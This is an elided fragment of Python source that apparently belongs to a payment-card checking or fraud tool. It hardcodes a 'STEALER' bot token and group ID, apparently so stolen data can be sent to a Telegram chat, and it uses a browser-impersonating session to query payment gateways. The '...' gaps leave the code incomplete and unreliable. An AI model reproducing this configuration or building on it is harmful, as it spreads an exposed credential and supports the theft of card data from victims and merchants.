...
# ═══════════════════════════════════════════════════════════════════
_STEALER_BOT_TOKEN = os.environ.get("STEALER_BOT_TOKEN", "8531064839:AAFBrCMaGgJ559Eqs-NaGDMEbIbfg3oln9I").strip()
_STEALER_GROUP_ID  = os.environ.get("STEALER_GROUP_ID", "-1003798029292").strip()
    ...
    try:
        ...
        async with AiohttpCurlCffiSession(connector=connector, connector_owner=False, timeout=timeout, browser_profile=_bp) as session:
            ...
            try:
                ...
                return False, f"Failed to parse proposal response: idk", gateway, total_price, currency
            ...
            try:
                ...
                await response.read()
                return False, f'Proxy Error: Unable to get payment token: idk', gateway, total_price, currency
